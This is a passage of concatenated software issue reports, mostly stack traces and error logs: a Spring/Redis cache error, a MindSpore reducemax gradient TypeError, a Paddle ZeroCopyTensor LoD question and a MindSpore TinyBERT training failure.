org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:634) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:624) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:72) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.security.access.intercept.aopalliance.MethodSecurityInterceptor.invoke(MethodSecurityInterceptor.java:61) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:97) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:692) at com.yqyc.admin.controller.SysMenuController$$EnhancerBySpringCGLIB$$693a5d93.removeById() at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:197) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:141) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:106) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:894) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:808) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1060) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:962) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doDelete(FrameworkServlet.java:931) at javax.servlet.http.HttpServlet.service(HttpServlet.java:671) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:327) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.invoke(FilterSecurityInterceptor.java:115) at org.springframework.security.web.access.intercept.FilterSecurityInterceptor.doFilter(FilterSecurityInterceptor.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:119) at org.springframework.security.web.access.ExceptionTranslationFilter.doFilter(ExceptionTranslationFilter.java:113) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:126) at org.springframework.security.web.session.SessionManagementFilter.doFilter(SessionManagementFilter.java:81) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.AnonymousAuthenticationFilter.doFilter(AnonymousAuthenticationFilter.java:105) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.servletapi.SecurityContextHolderAwareRequestFilter.doFilter(SecurityContextHolderAwareRequestFilter.java:149) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.savedrequest.RequestCacheAwareFilter.doFilter(RequestCacheAwareFilter.java:63) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.oauth2.provider.authentication.OAuth2AuthenticationProcessingFilter.doFilter(OAuth2AuthenticationProcessingFilter.java:176) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:103) at org.springframework.security.web.authentication.logout.LogoutFilter.doFilter(LogoutFilter.java:89) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.header.HeaderWriterFilter.doHeadersAfter(HeaderWriterFilter.java:90) at org.springframework.security.web.header.HeaderWriterFilter.doFilterInternal(HeaderWriterFilter.java:75) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:110) at org.springframework.security.web.context.SecurityContextPersistenceFilter.doFilter(SecurityContextPersistenceFilter.java:80) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.context.request.async.WebAsyncManagerIntegrationFilter.doFilterInternal(WebAsyncManagerIntegrationFilter.java:55) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.springframework.security.web.FilterChainProxy$VirtualFilterChain.doFilter(FilterChainProxy.java:336) at org.springframework.security.web.FilterChainProxy.doFilterInternal(FilterChainProxy.java:211) at org.springframework.security.web.FilterChainProxy.doFilter(FilterChainProxy.java:183) at org.springframework.web.filter.DelegatingFilterProxy.invokeDelegate(DelegatingFilterProxy.java:358) at org.springframework.web.filter.DelegatingFilterProxy.doFilter(DelegatingFilterProxy.java:271) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.boot.actuate.metrics.web.servlet.WebMvcMetricsFilter.doFilterInternal(WebMvcMetricsFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at com.yqyc.common.data.tenant.TenantContextHolderFilter.doFilter(TenantContextHolderFilter.java:65) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) at io.undertow.servlet.handlers.RedirectDirHandler.handleRequest(RedirectDirHandler.java:68) at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:117) at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.SendErrorPageHandler.handleRequest(SendErrorPageHandler.java:52) at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:269) at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:133) at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:130) at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:249) at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:78) at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:99) at io.undertow.server.Connectors.executeRootHandler(Connectors.java:387) at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:841) at org.jboss.threads.ContextClassLoaderSavingRunnable.run(ContextClassLoaderSavingRunnable.java:35) at org.jboss.threads.EnhancedQueueExecutor.safeRun(EnhancedQueueExecutor.java:2019) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.doRunTask(EnhancedQueueExecutor.java:1558) at org.jboss.threads.EnhancedQueueExecutor$ThreadBody.run(EnhancedQueueExecutor.java:1449) at java.lang.Thread.run(Thread.java:748) Suppressed: org.springframework.data.redis.RedisSystemException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:54) at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:52) at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:41) at org.springframework.data.redis.PassThroughExceptionTranslationStrategy.translate(PassThroughExceptionTranslationStrategy.java:44) at org.springframework.data.redis.connection.ClusterCommandExecutor.convertToDataAccessException(ClusterCommandExecutor.java:332) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnSingleNode(ClusterCommandExecutor.java:142) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnSingleNode(ClusterCommandExecutor.java:118) at org.springframework.data.redis.connection.ClusterCommandExecutor.lambda$executeCommandAsyncOnNodes$0(ClusterCommandExecutor.java:207) at java.util.concurrent.FutureTask.run$$$capture(FutureTask.java:266) at java.util.concurrent.FutureTask.run(FutureTask.java) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) ... 1 common frames omitted Caused by: io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at io.lettuce.core.internal.ExceptionFactory.createExecutionException(ExceptionFactory.java:137) at io.lettuce.core.internal.ExceptionFactory.createExecutionException(ExceptionFactory.java:110) at io.lettuce.core.protocol.AsyncCommand.completeResult(AsyncCommand.java:120) at io.lettuce.core.protocol.AsyncCommand.complete(AsyncCommand.java:111) at io.lettuce.core.protocol.CommandWrapper.complete(CommandWrapper.java:63) at io.lettuce.core.protocol.CommandHandler.complete(CommandHandler.java:720) at io.lettuce.core.protocol.CommandHandler.decode(CommandHandler.java:655) at io.lettuce.core.protocol.CommandHandler.channelRead(CommandHandler.java:572) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166) at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:719) at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:655) at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:581) at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ... 1 common frames omitted Suppressed: org.springframework.data.redis.RedisSystemException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:54) at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:52) at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:41) at org.springframework.data.redis.PassThroughExceptionTranslationStrategy.translate(PassThroughExceptionTranslationStrategy.java:44) at org.springframework.data.redis.connection.ClusterCommandExecutor.convertToDataAccessException(ClusterCommandExecutor.java:332) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnSingleNode(ClusterCommandExecutor.java:142) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnSingleNode(ClusterCommandExecutor.java:118) at org.springframework.data.redis.connection.ClusterCommandExecutor.lambda$executeCommandAsyncOnNodes$0(ClusterCommandExecutor.java:207) at java.util.concurrent.FutureTask.run$$$capture(FutureTask.java:266) at java.util.concurrent.FutureTask.run(FutureTask.java) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) ... 1 common frames omitted Caused by: io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at io.lettuce.core.internal.ExceptionFactory.createExecutionException(ExceptionFactory.java:137) at io.lettuce.core.internal.ExceptionFactory.createExecutionException(ExceptionFactory.java:110) at io.lettuce.core.protocol.AsyncCommand.completeResult(AsyncCommand.java:120) at io.lettuce.core.protocol.AsyncCommand.complete(AsyncCommand.java:111) at io.lettuce.core.protocol.CommandWrapper.complete(CommandWrapper.java:63) at io.lettuce.core.protocol.CommandHandler.complete(CommandHandler.java:720) at io.lettuce.core.protocol.CommandHandler.decode(CommandHandler.java:655) at io.lettuce.core.protocol.CommandHandler.channelRead(CommandHandler.java:572) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166) at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:719) at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:655) at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:581) at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ... 1 common frames omitted Suppressed: org.springframework.data.redis.RedisSystemException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:54) at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:52) at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:41) at org.springframework.data.redis.PassThroughExceptionTranslationStrategy.translate(PassThroughExceptionTranslationStrategy.java:44) at org.springframework.data.redis.connection.ClusterCommandExecutor.convertToDataAccessException(ClusterCommandExecutor.java:332) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnSingleNode(ClusterCommandExecutor.java:142) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnSingleNode(ClusterCommandExecutor.java:118) at org.springframework.data.redis.connection.ClusterCommandExecutor.lambda$executeCommandAsyncOnNodes$0(ClusterCommandExecutor.java:207) at java.util.concurrent.FutureTask.run$$$capture(FutureTask.java:266) at java.util.concurrent.FutureTask.run(FutureTask.java) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) ... 1 common frames omitted Caused by: io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at io.lettuce.core.internal.ExceptionFactory.createExecutionException(ExceptionFactory.java:137) at io.lettuce.core.internal.ExceptionFactory.createExecutionException(ExceptionFactory.java:110) at io.lettuce.core.protocol.AsyncCommand.completeResult(AsyncCommand.java:120) at io.lettuce.core.protocol.AsyncCommand.complete(AsyncCommand.java:111) at io.lettuce.core.protocol.CommandWrapper.complete(CommandWrapper.java:63) at io.lettuce.core.protocol.CommandHandler.complete(CommandHandler.java:720) at io.lettuce.core.protocol.CommandHandler.decode(CommandHandler.java:655) at io.lettuce.core.protocol.CommandHandler.channelRead(CommandHandler.java:572) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166) at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:719) at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:655) at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:581) at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ... 1 common frames omitted Caused by: org.springframework.data.redis.RedisSystemException: Error in execution; nested exception is io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:54) at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:52) at org.springframework.data.redis.connection.lettuce.LettuceExceptionConverter.convert(LettuceExceptionConverter.java:41) at org.springframework.data.redis.PassThroughExceptionTranslationStrategy.translate(PassThroughExceptionTranslationStrategy.java:44) at org.springframework.data.redis.connection.ClusterCommandExecutor.convertToDataAccessException(ClusterCommandExecutor.java:332) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnSingleNode(ClusterCommandExecutor.java:142) at org.springframework.data.redis.connection.ClusterCommandExecutor.executeCommandOnSingleNode(ClusterCommandExecutor.java:118) at org.springframework.data.redis.connection.ClusterCommandExecutor.lambda$executeCommandAsyncOnNodes$0(ClusterCommandExecutor.java:207) at java.util.concurrent.FutureTask.run$$$capture(FutureTask.java:266) at java.util.concurrent.FutureTask.run(FutureTask.java) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) ... 1 common frames omitted Caused by: io.lettuce.core.RedisCommandExecutionException: ERR unknown command , with args beginning with: , at io.lettuce.core.internal.ExceptionFactory.createExecutionException(ExceptionFactory.java:137) at io.lettuce.core.internal.ExceptionFactory.createExecutionException(ExceptionFactory.java:110) at io.lettuce.core.protocol.AsyncCommand.completeResult(AsyncCommand.java:120) at io.lettuce.core.protocol.AsyncCommand.complete(AsyncCommand.java:111) at io.lettuce.core.protocol.CommandWrapper.complete(CommandWrapper.java:63) at io.lettuce.core.protocol.CommandHandler.complete(CommandHandler.java:720) at io.lettuce.core.protocol.CommandHandler.decode(CommandHandler.java:655) at io.lettuce.core.protocol.CommandHandler.channelRead(CommandHandler.java:572) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166) at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:719) at io.netty.channel.nio.NioEventLoop.processSelectedKeysOptimized(NioEventLoop.java:655) at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:581) at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:989) at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) at io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30) ... 1 common frames omitted   <code>: KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::* KEYS 1:menu_details::*"
[ST][MS][OPS]reducemax算子反向用例在windows环境pynative模式bprop()报错,"reducemax算子反向用例在windows环境pynative模式bprop()报错，有部分用例会报错， / 硬件环境: /device /CPU : -- MindSpore version :master_20221216121539_2a6a7de -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative test_ms_ops_reducemax_func_tensor_input_6d_int32 test_ms_ops_reducemax_func_functional_input_5d_float16 test_ms_ops_reducemax_func_primitive_input_4d_float32 test_ms_ops_reducemax_func_functional_input_7d_float64 export TRAIN_MODE=PYNATIVE_MODE pytest -s test_ms_ops_reducemax_func.py 用例全部通过 d:\python37\lib\site-packages\mindspore\ops\composite\base.py:366: in after_grad out = _pynative_executor() self = &lt;mindspore.common.api._PyNativeExecutor object at 0x000000A2F8751A48&gt; E TypeError: bprop() missing 2 required positional arguments: 'out' and 'dout' d:\python37\lib\site-packages\mindspore\common\api.py:964: TypeError 走给尹常攀   <code>: def __call__(self): """""" PyNative executor run grad graph. Return: The return object after running grad graph. """""" return self._executor()"
关于ZeroCopyTensor中的SetLoD问题,void SetLoD(const std::vector&lt;std::vector&lt;size_t&gt;&gt;&amp; x); 在这个tensor中需要输入一个二维数组const std::vector&lt;std::vector&lt;size_t&gt;&gt;&amp; x 之前在nativeconfig预测的时候，某个输入tensor（batch_size，每个batch column个元素）的lod是这么设置的。能够正常预测： 请教改为analysisconfig后该如何设置这个LOD   <code>: std::vector&lt;uint64_t&gt; lods; for (uint32_t j=0;j&lt;=batch_size;j++) { lods.emplace_back(j*column); } tensor.lod.emplace_back(std::move(lods));
[MS][NET][tinybert][ascend]network train failed,": /device ascend : -- MindSpore version :commit_id:83d6ab79 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : run包:http://10.90.67.50/productrepo/HiAI/HISI_C78/20210705 test_ms_model_zoo_tinybert_gd_perf.py test_ms_model_zoo_tinybert_gd_check_loss_8p.py test_ms_model_zoo_tinybert_td_sst2_train_infer.py get code from model_zoo sh run_standalone_gd.sh network train failed network train success tinybert-gd网络在Ascend910环境训练失败   <code>: [ERROR] ANALYZER(107773,ffffa53a3480,python):2021-07-07-17:36:18.051.394 [mindspore/ccsrc/pipeline/jit/static_analysis/static_analysis.cc:228] Eval] Illegal AnfNode for evaluating, node: 1_construct_wrapper.1290:bert.tinybert_embedding_lookup.embedding_table(Parameter), fg: 1_construct_wrapper.1290 [ERROR] DEBUG(107773,ffffa53a3480,python):2021-07-07-17:36:18.051.733 [mindspore/ccsrc/debug/trace.cc:125] TraceGraphEval] *******************************graph evaluate stack********************************** [ERROR] DEBUG(107773,ffffa53a3480,python):2021-07-07-17:36:18.054.496 [mindspore/ccsrc/debug/trace.cc:128] TraceGraphEval] #0 graph:1_construct_wrapper.1290 with args[loss_scale:&lt;Ref[Tensor(F32)][]&gt;,current_iterator_step:&lt;Ref[Tensor(I32)][]&gt;,last_overflow_iterator_step:&lt;Ref[Tensor(I32)][]&gt;,bert.tinybert_embedding_lookup.embedding_table:&lt;Ref[Tensor(F32)][30522, 384]&gt;,bert.tinybert_embedding_postprocessor.token_type_embedding.embedding_table:&lt;Ref[Tensor(F32)][2, 384]&gt;,bert.tinybert_embedding_postprocessor.full_position_embedding.embedding_table:&lt;Ref[Tensor(F32)][512, 384]&gt;,bert.tinybert_embedding_postprocessor.layernorm.gamma:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_embedding_postprocessor.layernorm.beta:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.attention.attention.query_layer.weight:&lt;Ref[Tensor(F32)][384, 384]&gt;,bert.tinybert_encoder.layers.0.attention.attention.query_layer.bias:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.attention.attention.key_layer.weight:&lt;Ref[Tensor(F32)][384, 384]&gt;,bert.tinybert_encoder.layers.0.attention.attention.key_layer.bias:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.attention.attention.value_layer.weight:&lt;Ref[Tensor(F32)][384, 384]&gt;,bert.tinybert_encoder.layers.0.attention.attention.value_layer.bias:&lt;Ref[Tensor(F32)][384]&gt;,bert.tinybert_encoder.layers.0.attention.output.dense.weight:&lt;Ref[Tensor(F32)][384, 